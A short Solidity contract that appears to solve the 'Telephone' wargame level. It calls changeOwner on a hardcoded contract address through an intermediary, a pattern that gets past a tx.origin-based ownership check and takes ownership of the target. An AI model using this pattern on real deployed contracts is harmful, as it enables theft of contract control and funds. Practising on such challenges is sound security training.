// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Telephone {

        function changeOwner() external {
            IExpose attack = IExpose(0x4b598aed89Cf69828c7BdBc72648fEB70fF93D82);
            attack.changeOwner(msg.sender);
        }

}

interface IExpose {
    function changeOwner(address _owner) external;
}
